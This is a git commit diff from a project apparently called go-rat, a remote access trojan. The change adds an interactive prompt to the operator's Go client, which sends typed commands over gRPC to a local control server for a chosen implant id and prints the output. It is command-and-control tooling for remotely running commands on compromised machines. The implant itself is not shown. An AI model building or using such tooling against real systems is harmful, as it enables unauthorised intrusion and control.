cef1b1242a188ff7af883c537696a6c2fc93e869
nachh <iortego42madrid@gmail.com>
2024-06-09 19:22:32 +0200

    Primer prompt para el cliente, recibe como parametro el id del implant al que va a mandar los comandos

--- client/client.go
+++ client/client.go
@@ -1,21 +1,52 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"fmt"
+	"github.com/charmbracelet/lipgloss"
 	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"os"
+	"strings"
 )
+
+var prompt = lipgloss.NewStyle().
+	SetString("> ").
+	Foreground(lipgloss.Color("#9fef00"))
+
+func mainLoop(client grpcapi.AdminClient) {
+	var (
+		ctx context.Context
+		cmd *grpcapi.Command
+		err error
+	)
+	ctx = context.Background()
+	cmd = new(grpcapi.Command)
+	cmd.Id = os.Args[1]
+	s := bufio.NewScanner(os.Stdin)
+	for {
+		cmd.Out = ""
+		fmt.Print(prompt.Render())
+		s.Scan()
+		cmd.In = strings.Trim(s.Text(), " \n")
+		cmd, err = client.RunCommand(ctx, cmd)
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(cmd.Out)
+	}
+
+}
 
 func main() {
 	var (
-		opts         []grpc.DialOption
-		conn         *grpc.ClientConn
-		admin_client grpcapi.AdminClient
-		err          error
+		opts   []grpc.DialOption
+		err    error
+		conn   *grpc.ClientConn
+		client grpcapi.AdminClient
 	)
 	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
 	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
@@ -23,15 +54,6 @@ func main() {
 		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
 	}
 	defer conn.Close()
-	admin_client = grpcapi.NewAdminClient(conn)
-	ctx := context.Background()
-	var cmd = new(grpcapi.Command)
-	cmd.In = os.Args[1]
-	cmd.Id = os.Args[2]
-	cmd, err = admin_client.RunCommand(ctx, cmd)
-	log.Debug("[*] Resultado recibido.")
-	if err != nil {
-		log.Fatal(err)
-	}
-	fmt.Println(cmd.Out)
+	client = grpcapi.NewAdminClient(conn)
+	mainLoop(client)
 }
